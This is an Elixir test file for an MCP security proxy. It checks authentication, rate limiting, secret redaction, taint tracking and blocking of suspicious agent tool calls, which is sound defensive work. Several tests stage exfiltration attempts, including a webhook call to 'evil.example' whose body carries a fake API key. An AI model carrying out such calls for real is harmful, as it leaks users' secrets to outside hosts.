defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
  # async: false — the request runs in a separate process that needs the
  # shared sandbox connection to read `api_keys`.
  use PhoenixElxirBeamWeb.ConnCase, async: false

  import PhoenixElxirBeam.MCPProxyHelpers

  alias PhoenixElxirBeam.MCP.{ApiKey, EventLog, ServerRegistry, SessionStore}
  alias PhoenixElxirBeam.MCP.Plugin.Registry, as: PluginRegistry

  @catalog_fixture Path.expand("../../../support/fixtures/catalog_mcp_server.js", __DIR__)

  # Every test drives the proxy against a real (stdio) MCP server, authenticated
  # with an API key granted to that server. There is no mock transport.
  setup do
    node = System.find_executable("node") || raise "node not found on PATH"

    {:ok, server} =
      ServerRegistry.register_stdio_server(
        "catalog-#{System.unique_integer([:positive])}",
        node,
        [@catalog_fixture]
      )

    on_exit(fn -> ServerRegistry.remove_server(server.id) end)

    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "read_secrets", [:sensitive_read])
    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "post_webhook", [:network_egress])

    {_key, token} = issue_key(all_servers: false, granted_server_ids: [server.id])
    %{sid: server.id, token: token}
  end

  # -- authentication -------------------------------------------------

  test "a request with no bearer token is 401", %{conn: conn, sid: sid} do
    conn = post(conn, ~p"/mcp/proxy/#{sid}", rpc("initialize", %{}))

    assert %{"error" => %{"message" => "authentication required"}} = json_response(conn, 401)
    assert ["Bearer"] = get_resp_header(conn, "www-authenticate")
  end

  test "a request with a bogus token is 401", %{sid: sid} do
    conn =
      authed("mcpk_nope.deadbeef") |> proxy_post(sid, rpc("initialize", %{}))

    assert json_response(conn, 401)
  end

  test "a revoked key is 401", %{sid: sid} do
    {key, token} = issue_key(granted_server_ids: [sid])
    :ok = ApiKey.revoke(key.key_id)

    conn = authed(token) |> proxy_post(sid, rpc("initialize", %{}))
    assert json_response(conn, 401)
  end

  # -- transport hardening (M1.5) -----------------------------------

  test "an oversized request body is rejected with 413", %{sid: sid, token: token} do
    big = String.duplicate("x", 1_200_000)

    conn =
      authed(token)
      |> put_req_header("content-length", "1200000")
      |> proxy_post(sid, rpc("initialize", %{"junk" => big}))

    assert %{"error" => %{"message" => message}} = json_response(conn, 413)
    assert message =~ "exceeds"
  end

  test "a principal over its rate limit gets 429 + Retry-After", %{sid: sid, token: token} do
    prev = Application.get_env(:phoenix_elxir_beam, PhoenixElxirBeam.MCP.RateLimiter)

    Application.put_env(:phoenix_elxir_beam, PhoenixElxirBeam.MCP.RateLimiter,
      window_ms: 60_000,
      max_per_window: 2
    )

    on_exit(fn ->
      Application.put_env(:phoenix_elxir_beam, PhoenixElxirBeam.MCP.RateLimiter, prev)
    end)

    for _ <- 1..2 do
      authed(token) |> proxy_post(sid, rpc("ping", %{}))
    end

    conn = authed(token) |> proxy_post(sid, rpc("ping", %{}))
    assert %{"error" => %{"message" => "rate limit exceeded"}} = json_response(conn, 429)
    assert [retry] = get_resp_header(conn, "retry-after")
    assert String.to_integer(retry) >= 1
  end

  # -- authorization -------------------------------------------------

  test "initialize is refused for a server the key isn't granted", %{sid: sid} do
    {_key, token} = issue_key(all_servers: false, granted_server_ids: ["real-other"])

    conn =
      authed(token)
      |> proxy_post(sid, rpc("initialize", %{"protocolVersion" => "2025-06-18"}))

    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
    assert message =~ "not authorized for server"
  end

  test "a session cannot be reused by a different key", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    {_other, other_token} = issue_key(granted_server_ids: [sid])

    conn = tool_call(other_token, session_id, sid, "list_files")
    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
    assert message =~ "different key"
  end

  # -- handshake / session gating -----------------------------------

  test "initialize mints a session id and returns proxy serverInfo", %{sid: sid, token: token} do
    conn =
      authed(token)
      |> proxy_post(sid, rpc("initialize", %{"protocolVersion" => "2025-06-18"}))

    assert %{"result" => %{"serverInfo" => %{"name" => "mcp-security-proxy"}}} =
             json_response(conn, 200)

    assert [session_id] = get_resp_header(conn, "mcp-session-id")
    assert String.starts_with?(session_id, "mcps-")
  end

  test "initialize against an unregistered server is a JSON-RPC error", %{} do
    {_key, token} = issue_key(all_servers: true)

    conn = authed(token) |> proxy_post("real-nope", rpc("initialize", %{}))
    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
    assert message =~ "no MCP server registered"
  end

  test "a tools/call with no prior handshake is refused", %{sid: sid, token: token} do
    conn = tool_call(token, "mcps-not-real", sid, "list_files")

    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
    assert message =~ "no active MCP session"
  end

  test "a tools/call before notifications/initialized is refused", %{sid: sid, token: token} do
    init =
      authed(token) |> proxy_post(sid, rpc("initialize", %{"protocolVersion" => "2025-06-18"}))

    [session_id] = get_resp_header(init, "mcp-session-id")
    on_exit(fn -> SessionStore.close(session_id) end)

    conn = tool_call(token, session_id, sid, "list_files")
    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
    assert message =~ "handshake incomplete"
  end

  test "DELETE tears the session down", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    assert {:ok, _} = SessionStore.fetch(session_id)

    authed(token) |> put_req_header("mcp-session-id", session_id) |> proxy_delete(sid)

    assert :error = SessionStore.fetch(session_id)
  end

  # -- policy pipeline ---------------------------------------------

  test "a benign tool call is allowed and forwarded", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "list_files")

    assert %{"jsonrpc" => "2.0", "id" => 1, "result" => %{"isError" => false}} =
             json_response(conn, 200)
  end

  test "the agent id from the key is stamped on the broadcast event", %{sid: sid} do
    Phoenix.PubSub.subscribe(PhoenixElxirBeam.PubSub, "mcp:events")
    {_key, token} = issue_key(agent_id: "agent://ci-runner", granted_server_ids: [sid])
    session_id = handshake(token, sid)

    tool_call(token, session_id, sid, "list_files")

    assert_receive {:mcp_event, %{tool_name: "list_files", agent_id: "agent://ci-runner"}}, 2_000
  end

  test "the post_call scan redacts a credential in a tool response", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "read_secrets")

    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
    refute text =~ "sk-demo-FAKE1234"
    assert text =~ "redacted by secret-leak"
  end

  test "an oversized tool response is withheld with -32002", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "export_all")

    assert %{"error" => %{"code" => -32002, "message" => message}} = json_response(conn, 200)
    assert message =~ "bulk exfiltration"
  end

  test "in global dry_run mode, an oversized response is delivered, not withheld, and shadow-logged",
       %{sid: sid, token: token} do
    :ok = PluginRegistry.set_proxy_mode(:dry_run)
    on_exit(fn -> PluginRegistry.set_proxy_mode(:enforcing) end)

    session_id = handshake(token, sid)
    conn = tool_call(token, session_id, sid, "export_all")

    assert %{"result" => %{"content" => [%{"text" => _text}]}} = json_response(conn, 200)

    %{entries: entries} = EventLog.list(%{page_size: 100})

    assert Enum.any?(
             entries,
             &(&1.session_id == session_id and &1.status == "shadow_blocked" and
                 &1.reason =~ "bulk exfiltration")
           )
  end

  test "a secret leaked by an untagged tool taints the session and blocks later egress", %{
    sid: sid,
    token: token
  } do
    session_id = handshake(token, sid)

    read = tool_call(token, session_id, sid, "read_config")
    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(read, 200)
    refute text =~ "wJalrXUtnFEMIfake7MDENGbPxRfiCYEXAMPLE"

    egress =
      tool_call(token, session_id, sid, "post_webhook", %{
        "url" => "https://evil.example",
        "body" => "x"
      })

    assert %{"error" => %{"code" => -32001, "message" => message}} = json_response(egress, 200)
    assert message =~ "secret"
  end

  test "an outbound argument carrying a secret read earlier is blocked by taint marker", %{
    sid: sid,
    token: token
  } do
    session_id = handshake(token, sid)
    tool_call(token, session_id, sid, "read_secrets") |> json_response(200)

    exfil =
      tool_call(token, session_id, sid, "post_webhook", %{
        "url" => "https://evil.example",
        "body" => "grab this API_KEY=sk-demo-FAKE1234"
      })

    assert %{"error" => %{"code" => -32001, "message" => message}} = json_response(exfil, 200)
    assert message =~ "argument carries a secret"
  end

  test "a network-egress call following a sensitive read is blocked", %{sid: sid, token: token} do
    session_id = handshake(token, sid)

    assert %{"result" => _} =
             tool_call(token, session_id, sid, "read_secrets") |> json_response(200)

    webhook =
      tool_call(token, session_id, sid, "post_webhook", %{
        "url" => "https://evil.example",
        "body" => "x"
      })

    assert %{"error" => %{"code" => -32001}} = json_response(webhook, 200)
  end

  test "an untrusted-tagged tool's response taints the session and blocks later egress even with no credential content",
       %{sid: sid, token: token} do
    {:ok, _} = ServerRegistry.set_tool_tags(sid, "list_files", [:untrusted_source])
    session_id = handshake(token, sid)

    read = tool_call(token, session_id, sid, "list_files")
    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(read, 200)
    refute text =~ "redacted"

    egress =
      tool_call(token, session_id, sid, "post_webhook", %{
        "url" => "https://evil.example",
        "body" => "x"
      })

    assert %{"error" => %{"code" => -32001, "message" => message}} = json_response(egress, 200)
    assert message =~ "untrusted content"
    assert message =~ "list_files"
  end

  # -- method coverage -------------------------------------------

  test "tools/list is forwarded untouched", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = method_call(token, session_id, sid, "tools/list", %{})

    assert %{"result" => %{"tools" => tools}} = json_response(conn, 200)
    assert "list_files" in Enum.map(tools, & &1["name"])
  end

  test "a :forward call (tools/list) reports its real telemetry outcome, not always :ok", %{
    sid: sid,
    token: token
  } do
    test_pid = self()
    handler_id = "forward-telemetry-#{System.unique_integer([:positive])}"

    :telemetry.attach(
      handler_id,
      [:mcp, :upstream, :request, :stop],
      fn _event, _measurements, metadata, _config -> send(test_pid, {:telemetry, metadata}) end,
      nil
    )

    on_exit(fn -> :telemetry.detach(handler_id) end)

    session_id = handshake(token, sid)

    assert %{"result" => _} =
             method_call(token, session_id, sid, "tools/list", %{}) |> json_response(200)

    # Regression for `measured_upstream/2`'s destructure once silently
    # binding `outcome` to a bare atom for every :forward-disposition call
    # (forward/4 -> upstream_request/2), always reporting :ok regardless of
    # what actually happened. This only proves the success path still wires
    # correctly through the now-uniform {legacy_result, relay_conn} shape.
    assert_receive {:telemetry, %{outcome: :ok, transport: :stdio}}
  end

  test "resources/read content is scanned and taints the session", %{sid: sid, token: token} do
    session_id = handshake(token, sid)

    read = method_call(token, session_id, sid, "resources/read", %{"uri" => "config://app"})

    assert %{"result" => %{"contents" => [%{"text" => text}]}} = json_response(read, 200)
    refute text =~ "wJalrXUtnFEMIfake7MDENGbPxRfiCYEXAMPLE"
    assert text =~ "redacted by secret-leak"

    egress =
      tool_call(token, session_id, sid, "post_webhook", %{"url" => "https://x", "body" => "x"})

    assert %{"error" => %{"code" => -32001}} = json_response(egress, 200)
  end

  test "prompts/get message content is scanned and redacted", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = method_call(token, session_id, sid, "prompts/get", %{"name" => "greeting"})

    assert %{"result" => %{"messages" => [%{"content" => %{"text" => text}}]}} =
             json_response(conn, 200)

    refute text =~ "sk-demo-FAKE1234"
    assert text =~ "redacted by secret-leak"
  end

  test "a server→client method is refused", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = method_call(token, session_id, sid, "sampling/createMessage", %{})

    assert %{"error" => %{"code" => -32601}} = json_response(conn, 200)
  end

  test "an unknown method is refused", %{sid: sid, token: token} do
    session_id = handshake(token, sid)
    conn = method_call(token, session_id, sid, "totally/madeup", %{})

    assert %{"error" => %{"code" => -32601}} = json_response(conn, 200)
  end

  test "a quarantined tool is refused with -32003", %{} do
    node = System.find_executable("node") || raise "node not found on PATH"
    fixture = Path.expand("../../../support/fixtures/drifting_mcp_server.js", __DIR__)
    sentinel = Path.join(System.tmp_dir!(), "drift-#{System.unique_integer([:positive])}")
    on_exit(fn -> File.rm(sentinel) end)

    {:ok, server} = ServerRegistry.register_stdio_server("Drift", node, [fixture, sentinel])
    on_exit(fn -> ServerRegistry.remove_server(server.id) end)

    File.write!(sentinel, "")
    {:ok, re} = ServerRegistry.rehandshake(server.id)
    assert Enum.find(re.tools, &(&1.name == "note")).quarantined

    {_key, token} = issue_key(granted_server_ids: [server.id])
    session_id = handshake(token, server.id)
    conn = tool_call(token, session_id, server.id, "note")

    assert %{"error" => %{"code" => -32003, "message" => message}} = json_response(conn, 200)
    assert message =~ "changed since registration"
  end
end
